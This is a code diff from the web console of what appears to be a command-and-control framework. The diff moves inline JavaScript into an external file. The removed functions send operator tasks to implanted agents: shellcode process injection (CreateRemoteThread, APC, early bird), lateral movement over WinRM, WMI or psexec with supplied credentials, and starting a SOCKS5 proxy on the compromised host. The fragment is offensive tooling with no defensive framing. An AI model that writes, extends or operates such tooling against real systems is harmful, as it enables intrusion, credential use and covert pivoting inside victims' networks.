-        const tech = prompt("Technique (createremotethread | apc | earlybird):", "createremotethread");
-        const sc = prompt("Shellcode base64 (or leave for test NOPs - not sent):", "");
-        fetch(`/agents/${agentId}/inject`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: `pid=${encodeURIComponent(pid)}&tech=${encodeURIComponent(tech || '')}&shellcode=${encodeURIComponent(sc || '')}`
-        }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 2000); });
-    }
-
-    function doLateral() {
-        const spec = prompt("Lateral spec e.g. winrm|10.0.0.5|user|pass|whoami  OR  wmi|...  OR psexec|...", "winrm|127.0.0.1||whoami");
-        if (!spec) return;
-        appendOutput('<span class="text-indigo-400">LATERAL></span> ' + escapeHtml(spec));
-        fetch(`/agents/${agentId}/lateral`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'spec=' + encodeURIComponent(spec)
-        }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 4000); });
-    }
-
-    function doSocks() {
-        const port = prompt("Agent local SOCKS5 port:", "1080");
-        appendOutput('<span class="text-teal-400">SOCKS5></span> starting on agent port ' + (port||'1080'));
-        fetch(`/agents/${agentId}/socks`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'port=' + encodeURIComponent(port || "1080")
-        }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1500); });
-    }
-
-    function escapeHtml(text) {
-        const div = document.createElement('div');
-        div.textContent = text;
-        return div.innerHTML;
-    }
-
-    // Update prompt when shell changes
-    document.getElementById('shell-select').addEventListener('change', function() {
-        const prompt = this.value === 'powershell.exe' ? 'PS>' : 'CMD>';
-        document.getElementById('prompt').textContent = prompt;
-    });
-
-    // Focus input on load
-    document.getElementById('cmd-input').focus();
-</script>
+<script>const agentId = '{{.Agent.ID}}'; const osType = '{{.Agent.OS}}' === 'Linux' ? 'linux' : 'windows'; const agentHostname = '{{.Agent.Hostname}}';</script>
+<script src="/static/js/shell.js"></script>
 {{end}}
